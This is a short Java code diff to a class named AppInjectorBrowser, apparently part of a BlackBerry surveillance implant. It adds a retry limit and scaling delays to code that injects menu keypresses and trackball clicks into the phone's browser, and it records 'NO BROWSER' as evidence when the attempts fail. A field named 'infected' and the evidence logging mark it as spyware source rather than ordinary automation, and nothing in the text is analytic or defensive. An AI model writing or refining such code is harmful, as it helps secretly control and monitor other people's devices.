@@ -30,7 +30,10 @@ public class AppInjectorBrowser implements AppInjectorInterface, Singleton {
     private static AppInjectorBrowser instance;
     private static final long GUID = 0xa2b7338e410f087bL;
     private static final int DELAY = 5000;
+    private static final int MAX_TRIES = 12;
 
+    private int tries =0;
+    private int delay = 100;
     boolean infected;
 
     public static synchronized AppInjectorBrowser getInstance() {
@@ -66,11 +69,22 @@ public class AppInjectorBrowser implements AppInjectorInterface, Singleton {
         //#ifdef DEBUG
         debug.info("calling browser menu");
         //#endif
+        
+        if(tries >= MAX_TRIES){
+            //#ifdef DEBUG
+            debug.error("callMenuByKey: too many tries");
+            //#endif
+            if(tries++ == MAX_TRIES){
+                Evidence.info("NO BROWSER");
+            }
+
+            return false;
+        }
 
         KeyInjector.pressRawKeyCode(Keypad.KEY_MENU);
-        Utils.sleep(200);
+        Utils.sleep(delay + tries * 20);
         KeyInjector.pressRawKey(menu.toString().toLowerCase().charAt(0));
-        Utils.sleep(200);
+        Utils.sleep(delay + tries * 20);
         KeyInjector.trackBallRawClick();
 
         return true;
@@ -97,6 +111,10 @@ public class AppInjectorBrowser implements AppInjectorInterface, Singleton {
     public int getDelay() {
        
         return DELAY;
+    }
+
+    public void reset() {
+        tries = 0;
     }
 
 }
